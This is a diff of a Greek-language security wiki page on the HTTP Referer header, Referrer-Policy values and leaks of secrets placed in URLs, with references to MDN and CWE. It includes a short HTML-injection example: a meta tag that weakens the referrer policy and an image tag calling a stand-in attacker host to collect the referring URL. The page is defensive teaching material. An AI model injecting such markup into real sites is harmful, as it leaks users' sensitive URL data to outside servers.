@@ -1,19 +1,19 @@
-# Interesting HTTP
+# Ενδιαφέρουσα συμπεριφορά HTTP
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Referrer headers και policy
+## Header `Referer` και Referrer Policy
 
-Το Referrer είναι το header που χρησιμοποιούν οι browsers για να υποδεικνύουν ποια ήταν η προηγούμενη σελίδα που επισκέφτηκε ο χρήστης.
+Το HTTP request header `Referer` προσδιορίζει το απόλυτο ή μερικό URL από το οποίο ζητήθηκε ένας resource. Ανάλογα με την ενεργή referrer policy, μπορεί να περιλαμβάνει το referring origin, το path και το query string, αλλά όχι το URL fragment.<sup>[[1]](#references)</sup>
 
-### Sensitive information leak
+### Διαρροή ευαίσθητων πληροφοριών
 
-Αν σε οποιοδήποτε σημείο μιας web σελίδας εντοπίζονται ευαίσθητες πληροφορίες σε παραμέτρους ενός GET request, και η σελίδα περιέχει links προς εξωτερικές πηγές ή ένας attacker μπορεί να κάνει/να προτείνει μέσω social engineering στον χρήστη να επισκεφτεί ένα URL που ελέγχεται από τον attacker, θα μπορούσε να γίνει exfiltrate των ευαίσθητων πληροφοριών μέσα στο τελευταίο GET request.
+Secrets σε URL paths ή query parameters μπορούν να διαρρεύσουν μέσω του browser history, των logs, των analytics, των copied links και του header `Referer`. Επομένως, ένα cross-origin link ή subresource request μπορεί να αποκαλύψει το referring URL σε έναν external server.<sup>[[2]](#references)</sup>
 
 ### Mitigation
 
-Μπορείτε να κάνετε τον browser να ακολουθεί ένα **Referrer-policy**, το οποίο θα μπορούσε να **αποτρέψει** την αποστολή των ευαίσθητων πληροφοριών σε άλλες web εφαρμογές:
-```
+Χρησιμοποιήστε το response header `Referrer-Policy` για να ελέγξετε πόσες referrer πληροφορίες στέλνει ο browser. Το `strict-origin-when-cross-origin` είναι το σύγχρονο default στους browsers, ενώ το `no-referrer` καταστέλλει πλήρως το header· επιλέξτε την policy που ταιριάζει στις απαιτήσεις της εφαρμογής.<sup>[[3]](#references)</sup>
+```http
 Referrer-Policy: no-referrer
 Referrer-Policy: no-referrer-when-downgrade
 Referrer-Policy: origin
@@ -23,15 +23,21 @@ Referrer-Policy: strict-origin
 Referrer-Policy: strict-origin-when-cross-origin
 Referrer-Policy: unsafe-url
 ```
-### Αντιμετώπιση μέτρου
+Μην τοποθετείτε passwords, session identifiers, API keys ή άλλες ευαίσθητες τιμές σε URLs. Στέλνετέ τα σε κατάλληλα request headers ή request bodies μέσω TLS.<sup>[[2]](#references)</sup>
 
-Μπορείτε να παρακάμψετε αυτόν τον κανόνα χρησιμοποιώντας ένα HTML meta tag (ο attacker πρέπει να εκμεταλλευτεί ένα HTML injection):
+### Σκέψεις για το HTML Injection
+
+Ένα document μπορεί επίσης να ορίσει μια policy σε επίπεδο σελίδας με `<meta name="referrer">`. Αν ένα flaw HTML Injection επιτρέπει σε έναν attacker να εισαγάγει ένα effective meta element, ο attacker μπορεί να επιχειρήσει να αποδυναμώσει την policy του document για subsequent requests. Οι dynamically injected ή conflicting meta policies μπορεί να συμπεριφέρονται απρόβλεπτα, επομένως επαληθεύστε τη συμπεριφορά στο target browser αντί να υποθέτετε ότι το response header παρακάμπτεται πάντα.<sup>[[4]](#references)</sup>
 ```html
 <meta name="referrer" content="unsafe-url">
-<img src="https://attacker.com">
+<img src="https://attacker.example/collect" alt="">
 ```
-## Άμυνα
+Διόρθωσε το underlying HTML injection και κράτησε τα sensitive data εκτός του URL· η referrer policy αποτελεί defense in depth και όχι υποκατάστατο κανενός από τα δύο controls.
 
-Ποτέ μην τοποθετείτε ευαίσθητα δεδομένα μέσα σε παραμέτρους GET ή σε διαδρομές του URL.
+## References
 
+- [1] [MDN - `Referer` header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referer)
+- [2] [MITRE CWE-598 - Χρήση της GET Request Method με Sensitive Query Strings](https://cwe.mitre.org/data/definitions/598.html)
+- [3] [MDN - `Referrer-Policy` header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referrer-Policy)
+- [4] [MDN - `<meta name="referrer">`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/meta/name/referrer)
 {{#include ../banners/hacktricks-training.md}}
